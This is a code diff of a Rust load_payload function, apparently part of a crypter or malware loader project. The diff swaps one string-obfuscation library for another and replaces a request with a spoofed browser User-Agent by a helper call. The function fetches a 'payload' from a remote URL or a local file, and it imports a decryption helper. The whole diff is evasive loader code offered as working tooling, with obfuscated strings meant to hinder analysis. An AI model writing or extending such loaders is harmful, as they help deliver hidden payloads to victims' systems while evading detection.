@@ -1,5 +1,5 @@
 use std::env;
-use rustcrypt_ct_macros::{obf_lit};
+use obfstr::obfstr;
 use crate::utils::simple_decrypt;
 
 pub fn load_payload() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
@@ -13,19 +13,17 @@ pub fn load_payload() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
 
     if address.starts_with("http://") || address.starts_with("https://") {
         // Remote loading with user-agent spoofing
-        let response = minreq::get(&address)
-            .with_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-            .send()?;
+        let (status_code, body) = crate::utils::http_get(&address)?;
 
-        if response.status_code < 200 || response.status_code >= 300 {
-            return Err(format!("{} {}", obf_lit!("Network error:"), response.status_code).into());
+        if status_code < 200 || status_code >= 300 {
+            return Err(format!("{} {}", obfstr!("Network error:"), status_code).into());
         }
-        Ok(response.as_bytes().to_vec())
+        Ok(body)
     } else {
         // Local file loading with existence check
         let path = std::path::Path::new(&address);
         if !path.exists() {
-            return Err(format!("{} {}", obf_lit!("Resource unavailable:"), path.display()).into());
+            return Err(format!("{} {}", obfstr!("Resource unavailable:"), path.display()).into());
         }
 
         Ok(std::fs::read(&address)?)
